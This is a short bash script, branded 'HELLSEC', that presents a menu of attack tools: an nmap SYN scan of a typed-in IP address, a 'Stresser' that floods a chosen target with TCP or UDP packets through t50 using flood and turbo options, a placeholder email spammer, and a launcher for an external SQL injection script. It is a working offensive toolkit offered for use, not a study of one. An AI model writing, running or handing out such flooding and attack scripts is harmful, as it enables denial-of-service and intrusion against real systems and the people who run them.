#!/bin/bash
clear
echo -e "\e[90m##########################################################\e[0m"

echo -e   "\e[1;31m██╗  ██╗███████╗██╗     ██╗     ███████╗███████╗ ██████╗ #                 
██║  ██║██╔════╝██║     ██║     ██╔════╝██╔════╝██╔════╝ #
███████║█████╗  ██║     ██║     ███████╗█████╗  ██║      #
██╔══██║██╔══╝  ██║     ██║     ╚════██║██╔══╝  ██║      #
██║  ██║███████╗███████╗███████╗███████║███████╗╚██████╗ #
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝ ╚═════╝ #\e[0m"
echo -e "\e[90m##########################################################\e[0m"
echo -e "\e[37m1: Scanner"
echo "2: Stresser"
echo "3: Email Spammer"
echo "4: SqlInjection"
echo "5: Exit"
read -e -p "Please Select an option: " SEL
case $SEL in
    3) echo "3 is selected" 
    sleep 3
    clear
    echo "Sorry this module is unavalible at this time" ;;
    4) echo "Loading up SqlEasy by wine"
    sudo ./SqlEasy.sh ;;
 
    5) echo "Exiting"
    clear
    exit ;;
    
    1) echo "1: is selected" 
    sleep 3
    clear
    read -p "Enter an ip to scan:" Target
    echo ""
    echo "Performing TCP SYN scan"
    sudo nmap -sS $Target ;;
    
    2) echo "2 is selected" 
    sleep 3
    clear
    read -p "Enter a ip to Stress:" Target2
    read -p "TCP or UDP [T|U]" SEL2
    case $SEL2 in
        T|t|TCP) echo "TCP is selected"
        sleep 2
        clear
        echo "Attacking target"
        sudo t50 $Target2 --flood --turbo -S --protocol TCP ;;
        U|u|UDP)echo "UDP is selected"
        sleep 2
        clear
        sudo t50 $Target2 --flood --turbo -protocol UDP ;;
    *) echo "the fuck?" ;;
esac
esac
